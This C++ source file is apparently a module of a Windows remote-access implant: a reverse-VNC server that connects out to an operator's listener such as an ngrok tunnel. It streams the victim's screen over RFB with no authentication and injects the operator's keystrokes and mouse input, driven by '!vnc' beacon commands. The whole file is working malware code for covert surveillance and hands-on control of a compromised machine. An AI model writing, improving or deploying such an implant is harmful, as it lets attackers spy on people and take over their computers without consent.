// vnc.cpp — Reverse-VNC server. The implant dials out to the operator's
// listener (e.g. an ngrok TCP tunnel) and serves standard RFB 3.3 with
// None authentication. Screen is captured via GDI into a 32bpp DIB and
// pushed as raw tiles (only changed 32x32 tiles are sent). Viewer input
// is replayed with SendInput — full interactive control.
//
// Wire notes: RFB multi-byte ints are big-endian. GDI's 32bpp DIB is
// BGRX in memory, which reads as little-endian pixels with redShift 16,
// greenShift 8, blueShift 0 — declared in ServerInit to match.
#include <winsock2.h>
#include <ws2tcpip.h>
#include "vnc.hpp"
#include "utils.hpp"
#include <windows.h>
#include <cstdint>
#include <cstring>

static volatile LONG g_vncRunning = 0;

// ── socket helpers ───────────────────────────────────────────────────────────
static bool SendAll(SOCKET s, const void* buf, int len) {
    const char* p = static_cast<const char*>(buf);
    while (len > 0) {
        int n = send(s, p, len, 0);
        if (n == SOCKET_ERROR) return false;
        p += n; len -= n;
    }
    return true;
}
static bool RecvAll(SOCKET s, void* buf, int len) {
    char* p = static_cast<char*>(buf);
    while (len > 0) {
        int n = recv(s, p, len, 0);
        if (n <= 0) return false;
        p += n; len -= n;
    }
    return true;
}
static bool SendU16BE(SOCKET s, uint16_t v) {
    uint8_t b[2] = { static_cast<uint8_t>(v >> 8), static_cast<uint8_t>(v & 0xFF) };
    return SendAll(s, b, 2);
}
static bool SendU32BE(SOCKET s, uint32_t v) {
    uint8_t b[4] = { static_cast<uint8_t>(v >> 24), static_cast<uint8_t>(v >> 16),
                     static_cast<uint8_t>(v >> 8),  static_cast<uint8_t>(v & 0xFF) };
    return SendAll(s, b, 4);
}

// ── screen capture ───────────────────────────────────────────────────────────
struct Grab {
    HDC     hdcScreen = nullptr;
    HDC     hdcMem    = nullptr;
    HBITMAP hbmp      = nullptr;
    HGDIOBJ old       = nullptr;
    BYTE*   bits      = nullptr;   // top-down BGRX, w*4 bytes per row
    BYTE*   prev      = nullptr;   // last-sent copy for tile diffing
    int     w = 0, h = 0;
    size_t  frameBytes = 0;

    bool Init() {
        w = GetSystemMetrics(SM_CXSCREEN);
        h = GetSystemMetrics(SM_CYSCREEN);
        if (w <= 0 || h <= 0 || w > 8192 || h > 8192) return false;
        hdcScreen = GetDC(nullptr);
        hdcMem    = CreateCompatibleDC(hdcScreen);
        if (!hdcScreen || !hdcMem) return false;
        BITMAPINFO bi = {};
        bi.bmiHeader.biSize        = sizeof(BITMAPINFOHEADER);
        bi.bmiHeader.biWidth       = w;
        bi.bmiHeader.biHeight      = -h;          // top-down
        bi.bmiHeader.biPlanes      = 1;
        bi.bmiHeader.biBitCount    = 32;
        bi.bmiHeader.biCompression = BI_RGB;
        hbmp = CreateDIBSection(hdcMem, &bi, DIB_RGB_COLORS,
                                reinterpret_cast<void**>(&bits), nullptr, 0);
        if (!hbmp || !bits) return false;
        old = SelectObject(hdcMem, hbmp);
        frameBytes = static_cast<size_t>(w) * h * 4;
        prev = static_cast<BYTE*>(VirtualAlloc(nullptr, frameBytes,
                                               MEM_COMMIT | MEM_RESERVE,
                                               PAGE_READWRITE));
        if (!prev) return false;
        return true;
    }
    void Snap() {
        BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY | CAPTUREBLT);
    }
    void Free() {
        if (hdcMem && old) SelectObject(hdcMem, old);
        if (hbmp)   DeleteObject(hbmp);
        if (hdcMem) DeleteDC(hdcMem);
        if (hdcScreen) ReleaseDC(nullptr, hdcScreen);
        if (prev) VirtualFree(prev, 0, MEM_RELEASE);
        hdcMem = nullptr; hbmp = nullptr; prev = nullptr; bits = nullptr;
    }
    // Free() guards every member and nulls them out, so it is idempotent and
    // safe on a partially-initialised Grab. Releasing on scope exit fixes the
    // paths where Init() bailed after taking the screen DC but before the
    // bitmap, which used to leak the DC once per failed session.
    ~Grab() { Free(); }
};

// ── input injection ──────────────────────────────────────────────────────────
static void InjectKey(WORD vk, bool down) {
    INPUT in = {};
    in.type       = INPUT_KEYBOARD;
    in.ki.wVk     = vk;
    in.ki.dwFlags = down ? 0 : KEYEVENTF_KEYUP;
    SendInput(1, &in, sizeof(in));
}

static void SendKey(uint32_t keysym, bool down) {
    // Unicode keysyms (0x01000000 + ucs2) — dead keys and intl layouts
    if (keysym >= 0x01000000u) {
        INPUT in = {};
        in.type       = INPUT_KEYBOARD;
        in.ki.wScan   = static_cast<WORD>(keysym & 0xFFFF);
        in.ki.dwFlags = KEYEVENTF_UNICODE | (down ? 0 : KEYEVENTF_KEYUP);
        SendInput(1, &in, sizeof(in));
        return;
    }
    WORD vk = 0;
    switch (keysym) {
        case 0xFF08: vk = VK_BACK;   break;
        case 0xFF09: vk = VK_TAB;    break;
        case 0xFF0D: vk = VK_RETURN; break;
        case 0xFF1B: vk = VK_ESCAPE; break;
        case 0xFF50: vk = VK_HOME;   break;
        case 0xFF51: vk = VK_LEFT;   break;
        case 0xFF52: vk = VK_UP;     break;
        case 0xFF53: vk = VK_RIGHT;  break;
        case 0xFF54: vk = VK_DOWN;   break;
        case 0xFF55: vk = VK_PRIOR;  break;
        case 0xFF56: vk = VK_NEXT;   break;
        case 0xFF57: vk = VK_END;    break;
        case 0xFF63: vk = VK_INSERT; break;
        case 0xFFFF: vk = VK_DELETE; break;
        case 0xFFE1: case 0xFFE2: vk = VK_SHIFT;   break;
        case 0xFFE3: case 0xFFE4: vk = VK_CONTROL; break;
        case 0xFFE5: case 0xFFE6: vk = VK_CAPITAL; break;
        case 0xFFE9: case 0xFFEA: vk = VK_MENU;    break;
        case 0xFFEB: case 0xFFEC: vk = VK_LWIN;    break;
        default:
            if (keysym >= 0x20 && keysym <= 0x7E)
                vk = VkKeyScanA(static_cast<char>(keysym)) & 0xFF;
            break;
    }
    if (vk) InjectKey(vk, down);
}

static void SendPointer(uint16_t x, uint16_t y, uint8_t mask) {
    static uint8_t lastMask = 0;
    INPUT in = {};
    in.type       = INPUT_MOUSE;
    in.mi.dwFlags = MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_MOVE;
    int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN);
    in.mi.dx = static_cast<DWORD>(x * 65535LL / (sw > 1 ? sw - 1 : 1));
    in.mi.dy = static_cast<DWORD>(y * 65535LL / (sh > 1 ? sh - 1 : 1));
    SendInput(1, &in, sizeof(in));

    const struct { uint8_t bit; DWORD dn, up; } btns[3] = {
        { 1, MOUSEEVENTF_LEFTDOWN,   MOUSEEVENTF_LEFTUP   },
        { 2, MOUSEEVENTF_MIDDLEDOWN, MOUSEEVENTF_MIDDLEUP },
        { 4, MOUSEEVENTF_RIGHTDOWN,  MOUSEEVENTF_RIGHTUP  },
    };
    for (const auto& b : btns) {
        bool was = lastMask & b.bit, now = mask & b.bit;
        if (was != now) {
            in.mi.dwFlags = now ? b.dn : b.up;
            SendInput(1, &in, sizeof(in));
        }
    }
    lastMask = mask;
}

// ── framebuffer updates ──────────────────────────────────────────────────────
static bool SendUpdate(SOCKET s, Grab& g, uint16_t rx, uint16_t ry,
                       uint16_t rw, uint16_t rh, bool incremental) {
    if (rx >= g.w || ry >= g.h) return true;
    if (rx + rw > g.w) rw = static_cast<uint16_t>(g.w - rx);
    if (ry + rh > g.h) rh = static_cast<uint16_t>(g.h - ry);
    if (!rw || !rh) return true;

    g.Snap();

    constexpr int TILE = 32;
    const size_t rowBytes = static_cast<size_t>(g.w) * 4;

    // Collect changed 32x32 tiles inside the requested region.
    uint16_t tx0 = rx / TILE, ty0 = ry / TILE;
    uint16_t tx1 = (rx + rw - 1) / TILE, ty1 = (ry + rh - 1) / TILE;
    uint16_t tiles[4096][2];
    int nTiles = 0;
    for (uint16_t ty = ty0; ty <= ty1 && nTiles < 4096; ++ty) {
        for (uint16_t tx = tx0; tx <= tx1 && nTiles < 4096; ++tx) {
            int px = tx * TILE, py = ty * TILE;
            if (px >= g.w || py >= g.h) continue;
            int cw = (px + TILE > g.w) ? g.w - px : TILE;
            int ch = (py + TILE > g.h) ? g.h - py : TILE;
            bool changed = !incremental;
            if (incremental) {
                for (int row = 0; row < ch && !changed; ++row) {
                    const BYTE* a = g.bits + static_cast<size_t>(py + row) * rowBytes + px * 4;
                    const BYTE* b = g.prev + static_cast<size_t>(py + row) * rowBytes + px * 4;
                    if (memcmp(a, b, static_cast<size_t>(cw) * 4) != 0) changed = true;
                }
            }
            if (changed) { tiles[nTiles][0] = tx; tiles[nTiles][1] = ty; ++nTiles; }
        }
    }
    if (nTiles == 0) return true;

    // RFB FramebufferUpdate: U8 type + U16 numberOfRectangles — 3 bytes, no pad.
    uint8_t hdr[3] = { 0,
                       static_cast<uint8_t>(nTiles >> 8),
                       static_cast<uint8_t>(nTiles & 0xFF) };
    if (!SendAll(s, hdr, 3)) return false;

    for (int i = 0; i < nTiles; ++i) {
        int px = tiles[i][0] * TILE, py = tiles[i][1] * TILE;
        int cw = (px + TILE > g.w) ? g.w - px : TILE;
        int ch = (py + TILE > g.h) ? g.h - py : TILE;
        uint8_t rhdr[12];
        rhdr[0] = static_cast<uint8_t>(px >> 8); rhdr[1] = static_cast<uint8_t>(px & 0xFF);
        rhdr[2] = static_cast<uint8_t>(py >> 8); rhdr[3] = static_cast<uint8_t>(py & 0xFF);
        rhdr[4] = static_cast<uint8_t>(cw >> 8); rhdr[5] = static_cast<uint8_t>(cw & 0xFF);
        rhdr[6] = static_cast<uint8_t>(ch >> 8); rhdr[7] = static_cast<uint8_t>(ch & 0xFF);
        memset(rhdr + 8, 0, 4);                    // encoding 0 = raw
        if (!SendAll(s, rhdr, 12)) return false;
        for (int row = 0; row < ch; ++row) {
            const BYTE* src = g.bits + static_cast<size_t>(py + row) * rowBytes + px * 4;
            if (!SendAll(s, src, static_cast<size_t>(cw) * 4)) return false;
            memcpy(g.prev + static_cast<size_t>(py + row) * rowBytes + px * 4,
                   src, static_cast<size_t>(cw) * 4);
        }
    }
    return true;
}

// ── client message pump ──────────────────────────────────────────────────────
static bool ServeClient(SOCKET s, Grab& g) {
    for (;;) {
        uint8_t type = 0;
        if (!RecvAll(s, &type, 1)) return false;
        switch (type) {
            case 0: {  // SetPixelFormat — keep ours
                uint8_t junk[19];
                if (!RecvAll(s, junk, 19)) return false;
                break;
            }
            case 2: {  // SetEncodings — we always answer with raw
                uint8_t pad[3]; uint16_t cnt = 0;
                if (!RecvAll(s, pad, 3) || !RecvAll(s, &cnt, 2)) return false;
                cnt = ntohs(cnt);
                uint32_t enc = 0;
                for (uint16_t i = 0; i < cnt; ++i)
                    if (!RecvAll(s, &enc, 4)) return false;
                break;
            }
            case 3: {  // FramebufferUpdateRequest: U8 incremental, U16 x, y, w, h
                uint8_t incremental = 0;
                uint16_t x = 0, y = 0, w = 0, h = 0;
                if (!RecvAll(s, &incremental, 1)) return false;
                if (!RecvAll(s, &x, 2) || !RecvAll(s, &y, 2) ||
                    !RecvAll(s, &w, 2) || !RecvAll(s, &h, 2)) return false;
                if (!SendUpdate(s, g, ntohs(x), ntohs(y), ntohs(w), ntohs(h),
                                incremental != 0)) return false;
                Sleep(60);  // cap at ~15 fps
                break;
            }
            case 4: {  // KeyEvent
                uint8_t d[7]; uint32_t keysym = 0;
                if (!RecvAll(s, d, 7) || !RecvAll(s, &keysym, 4)) return false;
                SendKey(ntohl(keysym), d[0] != 0);
                break;
            }
            case 5: {  // PointerEvent
                uint8_t j[2]; uint16_t x = 0, y = 0; uint8_t mask = 0;
                if (!RecvAll(s, j, 2) || !RecvAll(s, &x, 2) ||
                    !RecvAll(s, &y, 2) || !RecvAll(s, &mask, 1)) return false;
                SendPointer(ntohs(x), ntohs(y), mask);
                break;
            }
            case 6: {  // ClientCutText — skip
                uint8_t j[3]; uint32_t len = 0;
                if (!RecvAll(s, j, 3) || !RecvAll(s, &len, 4)) return false;
                len = ntohl(len);
                while (len > 0) {
                    uint8_t sink[512]; int chunk = (len > sizeof(sink)) ? sizeof(sink) : (int)len;
                    if (!RecvAll(s, sink, chunk)) return false;
                    len -= chunk;
                }
                break;
            }
            default:
                return false;
        }
    }
}

// ── serve thread ─────────────────────────────────────────────────────────────
struct VncCtx { SOCKET s; };

// Runs one RFB session on an already-connected socket. Teardown lives in
// VncServeThread so it happens exactly once per session; here we only return.
static DWORD VncServe(SOCKET s) {
    Grab g;
    if (!g.Init()) return 1;

    // RFB 3.3 handshake: server picks None auth, no SecurityResult message.
    if (!SendAll(s, "RFB 003.003\n", 12)) return 1;
    uint8_t ver[12];
    if (!RecvAll(s, ver, 12))              return 1;
    if (!SendU32BE(s, 1))                  return 1;  // None
    uint8_t share = 0;
    if (!RecvAll(s, &share, 1))            return 1;

    // ServerInit
    bool ok = SendU16BE(s, static_cast<uint16_t>(g.w)) && SendU16BE(s, static_cast<uint16_t>(g.h));
    const uint8_t pf[16] = { 32, 24, 0, 1,          // bpp, depth, bigEndian, trueColour
                             0, 255, 0, 255, 0, 255, // maxes (big-endian U16s)
                             16, 8, 0,               // red, green, blue shifts
                             0, 0, 0 };              // padding
    ok = ok && SendAll(s, pf, 16);
    ok = ok && SendU32BE(s, 5) && SendAll(s, "GHOST", 5);
    if (!ok) return 1;

    // Prime the diff buffer so the first incremental request gets a full frame.
    g.Snap();
    memcpy(g.prev, g.bits, g.frameBytes);

    ServeClient(s, g);
    return 0;
}

static DWORD WINAPI VncServeThread(LPVOID p) {
    auto* ctx = static_cast<VncCtx*>(p);
    SOCKET s  = ctx->s;
    delete ctx;

    DWORD rc = VncServe(s);
    closesocket(s);
    // Balance the WSAStartup that HandleVnc did for this session; without it
    // every streaming run left the Winsock refcount one higher.
    WSACleanup();
    InterlockedExchange(&g_vncRunning, 0);
    return rc;
}

// ── public entry ─────────────────────────────────────────────────────────────
bool VncRunning() { return InterlockedCompareExchange(&g_vncRunning, 0, 0) != 0; }

// ── shared input injection (used by !input beacon command too) ───────────────
void VncInjectMouseNorm(int nx, int ny, int buttons) {
    if (nx < 0) nx = 0;
    if (nx > 10000) nx = 10000;
    if (ny < 0) ny = 0;
    if (ny > 10000) ny = 10000;
    int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN);
    SendPointer(static_cast<uint16_t>(nx * sw / 10000),
                static_cast<uint16_t>(ny * sh / 10000),
                static_cast<uint8_t>(buttons));
}

void VncInjectKeyVk(int vk, bool down) {
    if (vk > 0 && vk < 0xFFFF) InjectKey(static_cast<WORD>(vk), down);
}

std::wstring HandleVnc(const std::string& args) {
    if (VncRunning()) return L"[vnc: already streaming]";

    std::string host = args, port = "5500";
    while (!host.empty() && (host.front() == ' ' || host.front() == '\t')) host.erase(host.begin());
    size_t colon = host.rfind(':');
    if (colon != std::string::npos && colon > 0) {
        port = host.substr(colon + 1);
        host = host.substr(0, colon);
    }
    if (host.empty())
        return L"Usage: !vnc host[:port]  (default port 5500)";

    WSADATA wd;
    if (WSAStartup(MAKEWORD(2, 2), &wd) != 0)
        return L"[error: WSAStartup failed]";

    addrinfo hints = {};
    hints.ai_family   = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    addrinfo* res     = nullptr;
    if (getaddrinfo(host.c_str(), port.c_str(), &hints, &res) != 0 || !res) {
        WSACleanup();
        return L"[error: cannot resolve " + UTF8ToWString(host) + L"]";
    }

    SOCKET s = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
    if (s == INVALID_SOCKET) {
        freeaddrinfo(res); WSACleanup();
        return L"[error: socket failed]";
    }

    // Non-blocking connect with 5s cap so a dead endpoint can't stall the beacon.
    u_long nb = 1;
    ioctlsocket(s, FIONBIO, &nb);
    connect(s, res->ai_addr, (int)res->ai_addrlen);
    fd_set wset; FD_ZERO(&wset); FD_SET(s, &wset);
    timeval tv = { 5, 0 };
    int sel = select(0, nullptr, &wset, nullptr, &tv);

    // Writability alone proves nothing: Winsock also marks the socket writable
    // when a non-blocking connect *fails*, so the old check reported "streaming"
    // for an endpoint that had already refused us. The real verdict is SO_ERROR.
    int soErr = 0;
    if (sel == 1) {
        int len = sizeof(soErr);
        getsockopt(s, SOL_SOCKET, SO_ERROR, reinterpret_cast<char*>(&soErr), &len);
    } else if (sel == 0) {
        soErr = WSAETIMEDOUT;
    } else {
        soErr = WSAGetLastError();
        if (soErr == 0) soErr = WSASYSTEMFAILURE;
    }

    nb = 0;
    ioctlsocket(s, FIONBIO, &nb);
    freeaddrinfo(res);

    if (soErr != 0) {
        closesocket(s); WSACleanup();
        return L"[error: connect to " + UTF8ToWString(host) + L":" + UTF8ToWString(port)
             + L" failed (WSA " + std::to_wstring(soErr) + L")]";
    }

    // Claim the session slot before the thread exists. VncServeThread only ever
    // clears this flag, so VncRunning() was permanently false and the
    // "already streaming" guard above could never fire.
    InterlockedExchange(&g_vncRunning, 1);
    auto* ctx  = new VncCtx{ s };
    HANDLE hTh = CreateThread(nullptr, 0, VncServeThread, ctx, 0, nullptr);
    if (!hTh) {
        delete ctx;
        closesocket(s); WSACleanup();
        InterlockedExchange(&g_vncRunning, 0);
        return L"[error: thread failed]";
    }
    CloseHandle(hTh);
    return L"[+] VNC streaming to " + UTF8ToWString(host) + L":" + UTF8ToWString(port)
         + L" — connect any VNC viewer (RFB 3.3, no auth)";
}
